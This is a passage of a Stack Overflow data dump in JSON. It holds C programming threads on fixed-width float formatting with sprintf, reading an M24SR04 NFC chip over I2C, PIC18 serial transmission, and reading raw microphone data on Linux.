chars."}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542199383, "post_id": 53296362, "comment_id": 93481545, "body": "@chux &quot;%3g&quot; is interesting indeed, but not exactly what I need. Maybe the format string I need just doesn&#39;t exist?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542200889, "post_id": 53296362, "comment_id": 93482388, "body": "Your test cases do not include tricky ones like 99.999, 9.9999, 0.9999.  These &quot;just under a power of 10&quot; values tend to mess up candidate solutions."}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542201150, "post_id": 53296362, "comment_id": 93482557, "body": "@chux I expect all those to be rounded up to <code>100</code>, <code>10.</code> or ` 10<code>, and </code>1.0`."}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542201242, "post_id": 53296362, "comment_id": 93482615, "body": "@chux because <code>printf(&quot;%3g&quot;, 75.86);</code> yields <code>75.86</code>, not <code>76.</code> or ` 76`. (wops: I had a rounding error in the OP, sorry for that)"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1542202163, "post_id": 53296362, "comment_id": 93483234, "body": "If that rounding is significant you&#39;d need to establish the number of significant digits <i>before</i> you call <code>*printf( ...&quot;%*f&quot;...)</code>, and my answer would need a redesign. Note you can set rounding behavior with <a href=\"https://en.cppreference.com/w/c/numeric/fenv/feround\" rel=\"nofollow noreferrer\"><code>fesetround()</code></a>, but <code>*printf()</code> needs to know how many significant digits to round to."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542222318, "post_id": 53296362, "comment_id": 93494975, "body": "<a href=\"https://stackoverflow.com/q/32631178/2410359\">Writing IEEE 754-1985 double as ASCII on a limited 16 bytes string</a> may help."}], "answers": [{"comments": [{"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542186843, "post_id": 53296558, "comment_id": 93474039, "body": "Okay, so you mean that there is no sprintf format string to achieve what I need, and I need to format the string myself, right? :)"}, {"owner": {"reputation": 196, "user_id": 10064551, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cjaO0e2thE0/AAAAAAAAAAI/AAAAAAAAFWw/XWDIn9C-3sE/photo.jpg?sz=128", "display_name": "Sari Masri", "link": "https://stackoverflow.com/users/10064551/sari-masri"}, "reply_to_user": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542187037, "post_id": 53296558, "comment_id": 93474149, "body": "this is a custom sprintf to your situation :)"}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542187165, "post_id": 53296558, "comment_id": 93474213, "body": "I get it. Cheers :) Don&#39;t hesitate to flesh your answer a little bit. Also, since the question is about a sprintf formatting string and not a dedicated method, are you sure that there is no <code>fstring</code> such that <code>printf(fstring, a)</code> would always produce the desired output?"}, {"owner": {"reputation": 196, "user_id": 10064551, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cjaO0e2thE0/AAAAAAAAAAI/AAAAAAAAFWw/XWDIn9C-3sE/photo.jpg?sz=128", "display_name": "Sari Masri", "link": "https://stackoverflow.com/users/10064551/sari-masri"}, "reply_to_user": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542187645, "post_id": 53296558, "comment_id": 93474530, "body": "I think there is no fstring in c language but also we can build it, thank you for your suggestion"}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 1, "creation_date": 1542187737, "post_id": 53296558, "comment_id": 93474585, "body": "If you really think so, then I think it is worth making it explicit in your answer :)"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 3, "creation_date": 1542188343, "post_id": 53296558, "comment_id": 93474941, "body": "<code>printf(&quot;%d&quot;,a);</code> is undefined behavior, <code>printf(&quot;%d&quot;, (int)a);</code> would work."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542221151, "post_id": 53296558, "comment_id": 93494409, "body": "Sari Masri, <code>a = 1.0 printf(&quot;%2f&quot;, a);</code> --&gt; <code>&quot;1.000000&quot;</code>.  Perhaps you are thinking of <code>printf(&quot;%.2f&quot;, a);</code>.  Yet that has troubles too."}], "tags": [], "owner": {"reputation": 196, "user_id": 10064551, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cjaO0e2thE0/AAAAAAAAAAI/AAAAAAAAFWw/XWDIn9C-3sE/photo.jpg?sz=128", "display_name": "Sari Masri", "link": "https://stackoverflow.com/users/10064551/sari-masri"}, "is_accepted": false, "score": 0, "last_activity_date": 1542219800, "last_edit_date": 1542219800, "creation_date": 1542186755, "answer_id": 53296558, "question_id": 53296362, "link": "https://stackoverflow.com/questions/53296362/sprintf-formatting-fixed-number-of-characters-variable-numbers-of-decimals/53296558#53296558", "title": "sprintf formatting: fixed number of characters, variable numbers of decimals", "body": "<p>You could maybe try:</p>\n\n<pre><code>void mysprintf(float a) {\n    if (a &lt; 10 &amp;&amp; a &gt;= 0) {\n        printf(\"%2f\", a);\n    } else if (a &gt;= 10 &amp;&amp; a &lt; 100) {\n        printf(\"%1f\", a);\n\n    } else {\n        printf(\"%d\", (int)a);\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542234436, "post_id": 53300567, "comment_id": 93500149, "body": "Great, cheers :) I suspected I&#39;d have to write it myself, but didn&#39;t suspected it would be such a big work. Thank you again! I didn&#39;t get your line about monotony though, this rounding function sure is monotonic, right?"}, {"owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "edited": false, "score": 0, "creation_date": 1542278735, "post_id": 53300567, "comment_id": 93515357, "body": "Simpler with a lot of input work. I really appreciate your effort :)"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1542288478, "last_edit_date": 1542288478, "creation_date": 1542199537, "answer_id": 53300567, "question_id": 53296362, "link": "https://stackoverflow.com/questions/53296362/sprintf-formatting-fixed-number-of-characters-variable-numbers-of-decimals/53300567#53300567", "title": "sprintf formatting: fixed number of characters, variable numbers of decimals", "body": "<blockquote>\n  <p>Is this kind of fixed-width formatting implemented in sprintf format string language?</p>\n</blockquote>\n\n<p>No.</p>\n\n<blockquote>\n  <p>How to achieve this?</p>\n</blockquote>\n\n<p>To meet OP's goals, code can analyze the range of the <code>float f</code> to attempt to print with maximal information.</p>\n\n<p>This begins with <code>\"%.*f\"</code> to control the number of digits following the <code>.</code>.  </p>\n\n<p>A common pitfall occurs with values just under a power of 10 that round up and cause another digit in the output.</p>\n\n<p>Code could try to test against <code>f &lt; 0.995f</code> rather than <code>f &lt; 1.0</code> for example, yet this leads into failed corner cases given the binary nature of floating point.</p>\n\n<p>Better to test the range against an exact constant like 1.0, 10.0, ...</p>\n\n<p>The below tries, at most twice, to <code>sprintf()</code>.  The 2nd attempt occurs with those pesky values just under a power of 10.</p>\n\n<pre><code>#include &lt;assert.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;string.h&gt;\n\nvoid iago_sprint1(char *dest, int len, float f) {\n  if (f &lt; 1.0) {\n    char buf[len + 2];\n    //printf(\"p1\\n\");\n    snprintf(buf, sizeof buf, \"%.*f\", len - 1, f);\n    if (buf[0] == '0') {\n      strcpy(dest, buf + 1);\n      return;\n    }\n  }\n  float limit = 10.0;\n  int prec = len - 2;\n\n  while (prec &gt;= -1) {\n    if (f &lt; limit) {\n      char buf[len + 2];\n      //printf(\"p2\\n\");\n      int cnt = snprintf(buf, sizeof buf, \"%.*f\", prec &lt; 0 ? 0: prec, f);\n      if (cnt &lt;= len) {\n        strcpy(dest, buf);\n        return;\n      }\n    }\n    prec--;\n    limit *= 10;\n  }\n  assert(0); // `f` was out of range\n}\n\n#define N 3\nint main(void) {\n  float f[] = {0, 0.124f, 0.357f, 1.788f, 9.442f, 10.25f, 75.86f, 99.44f,\n      100.0f, 99.999f, 9.9999f, .99999f, .099999f, 1.04f, 1.06f};\n  char line[N + 1];\n\n  for (unsigned i = 0; i &lt; sizeof f / sizeof *f; i++) {\n    //snprintf(line, sizeof line, \"%#*g\", N, f[i]);\n    //puts(line);\n\n    iago_sprint1(line, N, f[i]);\n    puts(line);\n  }\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>.00\n.12\n.36\n1.8\n9.4\n10\n76\n99\n100\n100\n10\n1.0\n.10\n1.0\n1.1\n</code></pre>\n\n<hr>\n\n<p><strong>Pre-calculating precision needs pitfall</strong></p>\n\n<p>Should code attempt to pre-calculate the precision needed for  <strong>only 1</strong>  <code>sprintf()</code> call, the calculation needs to deduce precision just as <code>sprintf()</code> does - in effect code is doing sprint()` work over again.  </p>\n\n<p>Consider <code>len==3</code> and <code>float x = 9.95f;</code>.  As a binary <code>float</code> does not represent that exactly, it instead has a value just above or below 9.95<sup>1</sup>.  If it is below, the string should be <code>\"9.9\"</code>, if it is above, <code>\"10.\"</code>.  If code had <code>double x = 9.95;</code> (again not exactly representable) the output might differ.  If code used a <code>float</code>, but <code>FLT_EVAL_MODE &gt; 1</code>, the actual value passed might not be the expected <code>float 9.95</code>.  </p>\n\n<pre><code>Precision--&gt;  .1   .0 \n9.94001...   \"9.9\"  \"10.\"\n9.94999...   \"9.9\"  \"10.\" // Is this 9.95f\n9.95001...   \"10.0\" \"10.\" // or this?\n9.95999...   \"10.0\" \"10.\"\n</code></pre>\n\n<h1>New and improved</h1>\n\n<p>I re-worked and simplified code - after acceptance.</p>\n\n<p>The <em>trick</em> is to print with <code>\"%*.f\"</code> a calculated precision based on the power-of-10 of <code>f</code> to a buffer <em>one wider than the goal</em> - assuming no carry into another digit due to rounding.  </p>\n\n<p>The power-of-10 calculation can be done exactly with a small loop.</p>\n\n<p>When the leading character is a <code>0</code>, it is not needed as in <code>\"0.xx\"</code> --> <code>\".xx\"</code>.</p>\n\n<p>Otherwise with no carry into another digit due to rounding, the string fits and we are done. </p>\n\n<p>Otherwise a carry, then the last character is either a <code>'.'</code> or <code>'0'</code> after the decimal point and so not needed.  This happens when <code>f</code> is just below a power of 10, but the printed version rounds up to that power of 10.  And so only copy length-1 digits.</p>\n\n<pre><code>// `len` number of characters to print\n// `len+1` is the size of `dest`\nvoid iago_sprint3(char *dest, int len, float f) {\n  assert(len &gt;= 1);\n  int prec = len - 1;\n  float power10 = 1.0;\n  while (f &gt;= power10 &amp;&amp; prec &gt; 0) {\n    power10 *= 10;\n    prec--;\n  }\n\n  char buf[len + 2];\n  int cnt = snprintf(buf, sizeof buf, \"%.*f\", prec, f);\n  assert (cnt &gt;= 0 &amp;&amp; cnt &lt;= len + 1);\n  if (buf[0] == '0') {\n      strcpy(dest, buf + 1);\n      return;\n    }\n  strncpy(dest, buf, (unsigned) len);\n  dest[len] = 0;\n}\n</code></pre>\n\n<hr>\n\n<p><sup>1</sup> Typical <code>float 9.95f</code> is exactly   </p>\n\n<pre><code>9.94999980926513671875    \n</code></pre>\n\n<p>Typical <code>double 9.95</code> is exactly   </p>\n\n<pre><code>9.949999999999999289457264239899814128875732421875\n</code></pre>\n"}], "owner": {"reputation": 2509, "user_id": 3719101, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z4L8i.jpg?s=128&g=1", "display_name": "iago-lito &#39;considering leaving", "link": "https://stackoverflow.com/users/3719101/iago-lito-considering-leaving"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1346, "favorite_count": 0, "accepted_answer_id": 53300567, "answer_count": 2, "score": 1, "last_activity_date": 1542288478, "creation_date": 1542186122, "last_edit_date": 1542201268, "question_id": 53296362, "link": "https://stackoverflow.com/questions/53296362/sprintf-formatting-fixed-number-of-characters-variable-numbers-of-decimals", "title": "sprintf formatting: fixed number of characters, variable numbers of decimals", "body": "<p>I am <a href=\"http://www.cplusplus.com/reference/cstdio/printf/\" rel=\"nofollow noreferrer\">looking</a> for a <code>sprintf</code>-like format string that would format float numbers with a <em>variable</em> number of decimals, but a <strong>fixed</strong> total number of characters (say, 3), in order to provide maximum information. For instance:</p>\n\n<pre><code>0      -&gt;  `.00` or `0.0` or `  0`\n0.124  -&gt;  `.12`\n0.357  -&gt;  `.36`\n1.788  -&gt;  `1.8`\n9.442  -&gt;  `9.4`\n10.25  -&gt;  `10.` or ` 10`\n75.86  -&gt;  `76.` or ` 76`\n99.44  -&gt;  `99.` or ` 99`\n100.0  -&gt;  `100`\n</code></pre>\n\n<p>(yes, my numbers will all be 0-to-100 floats)</p>\n\n<p>How to achieve this?<br>\nIs this kind of fixed-width formatting implemented in sprintf format string language?</p>\n"}, {"tags": ["c++", "c", "i2c", "ndef"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542188923, "post_id": 53296355, "comment_id": 93475323, "body": "You need to post some code, say what environment, platform, machine are you using, what computer language are you interested in, what kind of problem do you have. What kind of answer do you expect to get? If you understand the datasheet, then you already know. Also, here&#39;s a quick tip for you, just search in google for <a href=\"https://www.google.pl/search?q=M24SR04+github\" rel=\"nofollow noreferrer\">M24SR04 github</a> results in for example <a href=\"https://github.com/gimasi/TUINO_ONE/blob/master/tuino_libs/tuino_hw/tuino_nfc/M24SR.cpp\" rel=\"nofollow noreferrer\">this repo</a> which seems to have a driver for your device. It&#39;s easier to find examples then you think."}, {"owner": {"reputation": 31, "user_id": 10292772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65704dd64011a793ba791f875dead89e?s=128&d=identicon&r=PG&f=1", "display_name": "\u041f\u0430\u0432\u0435\u043b \u041f\u043e\u0441\u0442\u043d\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/10292772/%d0%9f%d0%b0%d0%b2%d0%b5%d0%bb-%d0%9f%d0%be%d1%81%d1%82%d0%bd%d0%b8%d0%ba%d0%be%d0%b2"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542189749, "post_id": 53296355, "comment_id": 93475853, "body": "M24SR04 is connected to the Power PC 440EP. It is installed Linux. I&#39;m going to write in C / C ++. I want to at least find out how to open I2C session in practice."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542189908, "post_id": 53296355, "comment_id": 93475953, "body": "So the question is too broad. So, you are not asking on how to communicate with M24SR04 using I2C, you are asking about how to communicate with external device using I2C on Power PC 440EP with linux installed using C or C++ language? Does it has normal linux? So just using <a href=\"https://www.kernel.org/doc/Documentation/i2c/dev-interface\" rel=\"nofollow noreferrer\">the standard i2c linux driver</a> would be the solution, if you device&#39;s kernel supports it.  Do you have any <code>&#47;dev&#47;i2c-*</code> device files on your platform?"}, {"owner": {"reputation": 31, "user_id": 10292772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65704dd64011a793ba791f875dead89e?s=128&d=identicon&r=PG&f=1", "display_name": "\u041f\u0430\u0432\u0435\u043b \u041f\u043e\u0441\u0442\u043d\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/10292772/%d0%9f%d0%b0%d0%b2%d0%b5%d0%bb-%d0%9f%d0%be%d1%81%d1%82%d0%bd%d0%b8%d0%ba%d0%be%d0%b2"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542250767, "post_id": 53296355, "comment_id": 93504335, "body": "I can read information from another EEPROM connected to PowerPC. But I can not read the information from the memory of M24SR04. Because the memory of M24SR04 cannot be accessed like a regular EEPROM."}], "owner": {"reputation": 31, "user_id": 10292772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65704dd64011a793ba791f875dead89e?s=128&d=identicon&r=PG&f=1", "display_name": "\u041f\u0430\u0432\u0435\u043b \u041f\u043e\u0441\u0442\u043d\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/10292772/%d0%9f%d0%b0%d0%b2%d0%b5%d0%bb-%d0%9f%d0%be%d1%81%d1%82%d0%bd%d0%b8%d0%ba%d0%be%d0%b2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 73, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1542186091, "creation_date": 1542186091, "question_id": 53296355, "link": "https://stackoverflow.com/questions/53296355/how-to-read-the-ndef-message-m24sr04-y", "title": "How to read the NDEF message? (M24SR04-Y)", "body": "<p>I have a microcircuit M24SR04-Y, on which I recorded information using the NFC.</p>\n\n<p>I need to read this information using i2c.</p>\n\n<p>I read the datasheets and understood the circuit of communication with the microcircuit.</p>\n\n<p>But I am a novice and without an example it is very difficult to understand.</p>\n\n<p>Tell me how and in what form to send commands. If you show an example of communication with the chip, it will be great.</p>\n"}, {"tags": ["c", "pic"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542189060, "post_id": 53296213, "comment_id": 93475406, "body": "Please don&#39;t ask the same question again, but edit the previous one instead."}, {"owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "edited": false, "score": 0, "creation_date": 1542189201, "post_id": 53296213, "comment_id": 93475498, "body": "Here is a mistake: RCSTA1bits.SPEN - 1 ;. it should be ="}, {"owner": {"reputation": 61, "user_id": 10527902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd4a14f18b2334f6873d09788ab1f0d5?s=128&d=identicon&r=PG&f=1", "display_name": "M2T156", "link": "https://stackoverflow.com/users/10527902/m2t156"}, "edited": false, "score": 0, "creation_date": 1542189966, "post_id": 53296213, "comment_id": 93475992, "body": "I changed it and it&#39;s still giving NUL"}], "owner": {"reputation": 61, "user_id": 10527902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd4a14f18b2334f6873d09788ab1f0d5?s=128&d=identicon&r=PG&f=1", "display_name": "M2T156", "link": "https://stackoverflow.com/users/10527902/m2t156"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 16, "favorite_count": 0, "closed_date": 1542189009, "answer_count": 0, "score": 0, "last_activity_date": 1542188813, "creation_date": 1542185582, "last_edit_date": 1542188813, "question_id": 53296213, "link": "https://stackoverflow.com/questions/53296213/not-able-to-transmit-bytes-to-docklight-eusart", "closed_reason": "Duplicate", "title": "Not able to transmit bytes to docklight EUSART", "body": "<p>This is my code:</p>\n\n<pre><code>#include &lt;xc.h&gt;\n#include \"PIC.h\"\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pic18f45k80.h&gt;\n\n#define _XTAL_FREQ 16000000\n\n// INITIAL PIN SETUP\n\nvoid PIN_MANAGER_Initialize(void)\n{\n    /**\n    LATx registers\n    */\n    LATE = 0x00;\n    LATD = 0x00;\n    LATA = 0x00;\n    LATB = 0x00;\n    LATC = 0x00;\n\n    /**\n    TRISx registers\n    */\n    TRISE = 0x07;\n    TRISA = 0x08;\n    TRISB = 0x01;\n    TRISC = 0b00010000;\n    TRISD = 0xEF;\n\n    PORTC = 0b00010010 ;\n\n    /**\n    ANSELx registers\n    */\n    ANCON0 = 0x00;\n    ANCON1 = 0x00;\n\n    /**\n    WPUx registers\n    */\n    WPUB = 0x00;\n    INTCON2bits.nRBPU = 1; \n}\n\n// INITIAL SETUP SPI\n\nvoid SPI_Initialize(void)\n{\n    // SMP Middle; CKE Idle to Active; \n    SSPSTAT = 0x00;\n\n    // SSPEN enabled; WCOL no_collision; CKP Idle:High, Active:Low; SSPM FOSC/4; SSPOV no_overflow; \n    SSPCON1 = 0x30;\n\n    // SSPADD 0; \n    SSPADD = 0x00;\n}\n\n// INITIAL SETUP EUSART\nvoid EUSART_Initialize(void)\n{\n\n    TRISCbits.TRISC6 = 0 ;\n\n    TXSTA1bits.SYNC = 0 ;\n    TXSTA1bits.TX9 = 0 ;\n    TXSTA1bits.TXEN = 1 ;\n\n    RCSTA1bits.RX9 = 0 ;\n    RCSTA1bits.CREN = 1 ;\n    RCSTA1bits.SPEN - 1 ;\n\n    BAUDCON1bits.BRG16 = 0 ;\n    TXSTA1bits.BRGH = 0 ;\n    SPBRG1 = 25 ;\n}\n\n\nvoid BASIC(void)\n{\n    while (TXSTA1bits.TRMT == 0) {}\n    TXREG1 = \"C\" ;\n}\n\nvoid SYSTEM_Initialize(void)\n{\n    PIN_MANAGER_Initialize();\n    SPI_Initialize();\n    EUSART_Initialize();\n}\n\n\nvoid main(void)\n{\n    SYSTEM_Initialize();\n\n    while (1)\n    {\n        __delay_ms (25);\n        BASIC();\n    }\n}\n</code></pre>\n\n<p>I am using a PIC18F45K80 MCU and XC8 MPLAB X IDE. The baudrate I want to set is 38400. I want to send a byte (character C). All I get once I upload the code from docklight is NUL and then again NUL repeatidly. Soon I would like to print a sentence. The output for TX should be EUSART1 I believe.</p>\n"}, {"tags": ["c", "linux", "audio"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1542181669, "post_id": 53295211, "comment_id": 93471430, "body": "There should be many good libraries and frameworks which can help you find a suitable input device at run-time, and then let you open and read the raw data from that device. I suggest you try to find such a library or framework instead of attempting to access the device directly."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542183266, "post_id": 53295211, "comment_id": 93472114, "body": "@Someprogrammerdude I&#39;m doing this for learning purpose. So working with a sound card directly is one of my interest. I tried to open some devices with <code>O_RDONLY</code> flag but continiously getting <code>EBADF</code> errno. It would be great if you can advice where to start with to learn how to work with devices directly on <code>Linux</code>?"}], "owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 187, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1542181288, "creation_date": 1542181288, "question_id": 53295211, "link": "https://stackoverflow.com/questions/53295211/how-to-read-a-raw-signal-from-a-microphone", "title": "How to read a raw signal from a microphone?", "body": "<p><code>Linux Ubuntu 18.04</code>\nI'm trying to get the raw signal from a microphone as byte sequence and do some signal processing by myself. My first thought was actually just to find a device in the <code>/dev</code> directory, open file descriptor and start reading from it. But I discovered that there is audio library <a href=\"http://www.alsa-project.org/main/index.php/Main_Page\" rel=\"nofollow noreferrer\">ALSA</a> which I think does not really provide the ability to read a raw signal from the microphone.</p>\n\n<p>So I found the <code>/dev/snd</code> directory and got confused. Here is how it looks like on my machine:</p>\n\n<pre><code>/dev/snd$ tree\n.\n\u251c\u2500\u2500 by-path\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pci-0000:00:03.0 -&gt; ../controlC0\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 pci-0000:00:1b.0 -&gt; ../controlC1\n\u251c\u2500\u2500 controlC0\n\u251c\u2500\u2500 controlC1\n\u251c\u2500\u2500 hwC0D0\n\u251c\u2500\u2500 hwC1D0\n\u251c\u2500\u2500 pcmC0D3p\n\u251c\u2500\u2500 pcmC0D7p\n\u251c\u2500\u2500 pcmC0D8p\n\u251c\u2500\u2500 pcmC1D0c\n\u251c\u2500\u2500 pcmC1D0p\n\u251c\u2500\u2500 pcmC1D1p\n\u251c\u2500\u2500 pcmC1D2c\n\u251c\u2500\u2500 seq\n\u2514\u2500\u2500 